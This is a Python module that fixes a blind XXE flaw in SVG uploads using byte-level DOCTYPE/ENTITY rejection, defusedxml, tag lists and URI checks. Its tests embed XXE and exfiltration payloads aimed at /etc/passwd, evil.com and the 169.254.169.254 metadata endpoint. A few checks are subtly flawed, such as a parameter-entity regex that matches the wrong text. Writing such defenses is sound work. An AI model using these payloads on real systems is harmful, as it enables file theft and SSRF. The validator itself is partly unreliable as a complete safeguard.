"""
fix_xxe_svg_upload_665.py — Blind XXE via SVG Upload → SSRF + Data Exfil Fix

VULNERABILITY (#665):
SVG file upload does not disable XML external entity (XXE) parsing.
Attackers craft SVG with DOCTYPE/ENTITY declarations to:
- Read server files (/etc/passwd, AWS keys)
- Perform SSRF against internal services (169.254.169.254)
- Blind data exfiltration via OOB channels

FIX:
1. Reject DOCTYPE declarations before parsing (fast-fail)
2. Reject ENTITY declarations before parsing
3. Use defusedxml for safe XML/SVG parsing
4. Enforce SVG tag whitelist
5. Block dangerous elements (script, foreignObject, etc.)
6. Validate element count and nesting depth
7. Sanitize URI attributes to prevent SSRF via xlink:href
"""

import re
from io import BytesIO
from typing import Any, Dict, Final, Optional, Set


# =============================================================================
# Configuration
# =============================================================================

class XXESecurityConfig:
    """Configuration for XXE-safe SVG processing."""
    max_file_size: int = 2 * 1024 * 1024        # 2 MiB
    max_element_count: int = 10_000
    max_depth: int = 64
    # Safe SVG tags only
    allowed_tags: Final[Set[str]] = frozenset({
        "svg", "g", "path", "circle", "rect", "line", "polyline",
        "polygon", "text", "tspan", "defs", "use", "image",
        "linearGradient", "radialGradient", "stop", "clipPath",
        "mask", "filter", "feGaussianBlur", "feOffset", "feBlend",
        "feMerge", "feMergeNode", "feColorMatrix", "feComposite",
        "feComponentTransfer", "feFuncR", "feFuncG", "feFuncB",
        "feFuncA", "symbol", "marker", "pattern", "viewBox",
        "title", "desc", "metadata", "style", "switch",
    })
    forbidden_tags: Final[Set[str]] = frozenset({
        "script", "foreignObject", "iframe", "object", "embed",
        "audio", "video", "handler", "listener", "set", "animate",
        "animateMotion", "animateTransform",
    })
    # Only these URI schemes are allowed in href/src attributes
    safe_uri_schemes: Final[Set[str]] = frozenset({"data", "#", ""})
    # Safe data URIs limited to images
    safe_data_uri_re: Final[re.Pattern] = re.compile(
        r"^data:image/(?:png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$"
    )
    # Inline event handlers (on*) are always blocked
    event_attr_re: Final[re.Pattern] = re.compile(r"^on[a-z]+$", re.IGNORECASE)
    # Attributes that may contain URIs
    uri_attributes: Final[Set[str]] = frozenset({
        "href", "xlink:href", "src", "action", "formaction",
        "poster", "background",
    })


DEFAULT_CONFIG = XXESecurityConfig()

# Pre-compile rejection patterns (byte-level, no parser needed)
_DOCTYPE_RE: Final[re.Pattern[bytes]] = re.compile(rb"<!DOCTYPE", re.IGNORECASE)
_ENTITY_RE: Final[re.Pattern[bytes]] = re.compile(rb"<!ENTITY", re.IGNORECASE)
_PARAM_ENTITY_RE: Final[re.Pattern[bytes]] = re.compile(rb"<!ENTITY\s+%s+", re.IGNORECASE)


class XXEError(ValueError):
    """Raised when an uploaded SVG contains unsafe content."""


# =============================================================================
# Pre-parse Byte-Level Rejection
# =============================================================================

def reject_dangerous_bytes(content: bytes, config: XXESecurityConfig = DEFAULT_CONFIG) -> Optional[str]:
    """
    Fast-fail: scan raw bytes for DOCTYPE / ENTITY declarations.

    Returns error message if rejected, None if safe.
    """
    if len(content) > config.max_file_size:
        return f"File too large: {len(content)} > {config.max_file_size}"

    if _DOCTYPE_RE.search(content):
        return "DOCTYPE declaration rejected"

    if _ENTITY_RE.search(content):
        return "ENTITY declaration rejected"

    if _PARAM_ENTITY_RE.search(content):
        return "Parameter entity reference rejected"

    return None


# =============================================================================
# Safe SVG Parser (using defusedxml or stdlib fallback)
# =============================================================================

class SafeSVGParser:
    """Parses SVG content safely, preventing XXE attacks."""

    @staticmethod
    def create_parser():
        """Create a safe XML parser that disables external entities."""
        try:
            from defusedxml.ElementTree import parse as _parse
            return _parse
        except ImportError:
            # stdlib xml.etree.ElementTree does NOT resolve external entities
            # by default, but we still do byte-level rejection above.
            import xml.etree.ElementTree as ET
            return ET.parse

    @staticmethod
    def parse(content: bytes, config: XXESecurityConfig = DEFAULT_CONFIG):
        """
        Parse SVG content safely.

        Steps:
        1. Byte-level DOCTYPE/ENTITY rejection
        2. Parse with safe parser (defusedxml preferred)
        3. Post-parse validation (tag whitelist, depth, etc.)
        4. Attribute sanitization
        """
        # Step 1: Fast-fail on raw bytes
        err = reject_dangerous_bytes(content, config)
        if err:
            raise XXEError(err)

        # Step 2: Parse safely
        parser = SafeSVGParser.create_parser()
        root = parser(BytesIO(content))

        # Step 3: Post-parse validation
        counter = [0]  # mutable counter for recursion
        SafeSVGParser._validate_tree(root.getroot(), config, counter)

        return root

    @staticmethod
    def _validate_tree(elem, config: XXESecurityConfig, counter: list, depth: int = 0):
        """Recursively validate SVG tree structure."""
        counter[0] += 1
        if counter[0] > config.max_element_count:
            raise XXEError("Element count exceeds limit")
        if depth > config.max_depth:
            raise XXEError("Nesting depth exceeds limit")

        # Strip namespace for tag comparison
        tag = elem.tag.rsplit("}", 1)[-1] if "}" in elem.tag else elem.tag

        # Check forbidden tags
        if tag in config.forbidden_tags:
            raise XXEError(f"Forbidden element: <{tag}>")

        # Check tag whitelist (only allow known safe tags)
        if tag not in config.allowed_tags:
            raise XXEError(f"Tag not in whitelist: <{tag}>")

        # Validate attributes
        for attr_name, attr_value in list(elem.attrib.items()):
            local_attr = attr_name.rsplit("}", 1)[-1] if "}" in attr_name else attr_name

            # Block event handlers (onclick, onload, etc.)
            if config.event_attr_re.match(local_attr):
                raise XXEError(f"Event handler attribute blocked: {local_attr}")

            # Validate URI attributes
            if local_attr in config.uri_attributes:
                SafeSVGParser._validate_uri(attr_value, local_attr, config)

        # Recurse into children
        for child in elem:
            SafeSVGParser._validate_tree(child, config, counter, depth + 1)

    @staticmethod
    def _validate_uri(value: str, attr_name: str, config: XXESecurityConfig):
        """Validate a URI attribute value against safe schemes."""
        value_stripped = value.strip()

        # Fragment references (#id) are safe
        if value_stripped.startswith("#"):
            return

        # Empty is safe
        if not value_stripped:
            return

        # Data URIs — only allow image types
        if value_stripped.lower().startswith("data:"):
            if not config.safe_data_uri_re.match(value_stripped):
                raise XXEError(f"Unsafe data URI in {attr_name}: {value_stripped[:80]}")
            return

        # HTTP/HTTPS to external domains is blocked
        if value_stripped.lower().startswith(("http://", "https://")):
            raise XXEError(f"External URI blocked in {attr_name}: {value_stripped[:80]}")

        # file://, ftp://, etc. blocked
        if "://" in value_stripped:
            scheme = value_stripped.split("://")[0].lower()
            if scheme not in config.safe_uri_schemes:
                raise XXEError(f"Unsafe URI scheme '{scheme}' in {attr_name}")


# =============================================================================
# SVG Upload Handler (secure)
# =============================================================================

class SecureSVGUploadHandler:
    """Handles SVG file uploads with XXE protection."""

    def __init__(self, config: XXESecurityConfig = DEFAULT_CONFIG):
        self.config = config

    def process_upload(self, filename: str, content: bytes) -> Dict[str, Any]:
        """
        Process an uploaded SVG file.

        Returns dict with 'safe' status and sanitized content.
        Raises XXEError if the upload is malicious.
        """
        # Validate file extension
        if not filename.lower().endswith(".svg"):
            raise XXEError("Only .svg files accepted")

        # Validate and parse
        parsed = self.config  # shorthand
        err = reject_dangerous_bytes(content, parsed)
        if err:
            raise XXEError(err)

        # Parse and validate tree
        root = SafeSVGParser.parse(content, parsed)

        # Serialize back to clean bytes (strips any dodgy content)
        import xml.etree.ElementTree as ET
        clean_bytes = ET.tostring(root.getroot(), encoding="unicode")

        return {
            "filename": filename,
            "size": len(clean_bytes),
            "safe": True,
            "content": clean_bytes.encode("utf-8"),
        }


# =============================================================================
# Tests
# =============================================================================

def test_doctype_rejection():
    svg_with_doctype = b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg></svg>'
    assert reject_dangerous_bytes(svg_with_doctype) is not None
    print("PASS: DOCTYPE rejection works")


def test_entity_rejection():
    svg_with_entity = b'<svg xmlns="http://www.w3.org/2000/svg"><!ENTITY xxe SYSTEM "http://evil.com/dtd"></svg>'
    assert reject_dangerous_bytes(svg_with_entity) is not None
    print("PASS: ENTITY rejection works")


def test_safe_svg_passes():
    safe_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" width="100" height="100"/></svg>'
    assert reject_dangerous_bytes(safe_svg) is None
    print("PASS: Safe SVG passes byte check")


def test_forbidden_tag_rejection():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    try:
        SafeSVGParser.parse(svg)
        assert False, "Should have raised XXEError"
    except XXEError as e:
        assert "forbidden" in str(e).lower() or "Script" in str(e) or "script" in str(e)
    print("PASS: Forbidden tag rejection works")


def test_event_handler_rejection():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" onclick="alert(1)"><rect/></svg>'
    try:
        SafeSVGParser.parse(svg)
        assert False, "Should have raised XXEError"
    except XXEError:
        pass
    print("PASS: Event handler rejection works")


def test_external_uri_rejection():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://evil.com/exfil"/></svg>'
    try:
        SafeSVGParser.parse(svg)
        assert False, "Should have raised XXEError"
    except XXEError:
        pass
    print("PASS: External URI rejection works")


def test_data_uri_allowed():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/png;base64,iVBORw0KGgo="/></svg>'
    result = SafeSVGParser.parse(svg)
    assert result is not None
    print("PASS: Safe data URI allowed")


def test_fragment_ref_allowed():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><use href="#myShape"/></svg>'
    result = SafeSVGParser.parse(svg)
    assert result is not None
    print("PASS: Fragment reference allowed")


def test_full_upload_flow():
    handler = SecureSVGUploadHandler()
    safe_svg = b'<svg xmlns="http://www.w3.org/2000/svg"><rect x="0" y="0" width="50" height="50"/></svg>'
    result = handler.process_upload("icon.svg", safe_svg)
    assert result["safe"] is True
    assert "icon.svg" in result["filename"]

    # Malicious SVG should fail
    malicious = b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "http://169.254.169.254/">]><svg>&x;</svg>'
    try:
        handler.process_upload("evil.svg", malicious)
        assert False, "Should have raised"
    except XXEError:
        pass
    print("PASS: Full upload flow works")


if __name__ == "__main__":
    test_doctype_rejection()
    test_entity_rejection()
    test_safe_svg_passes()
    test_forbidden_tag_rejection()
    test_event_handler_rejection()
    test_external_uri_rejection()
    test_data_uri_allowed()
    test_fragment_ref_allowed()
    test_full_upload_flow()
    print("\n✅ All XXE prevention tests passed!")
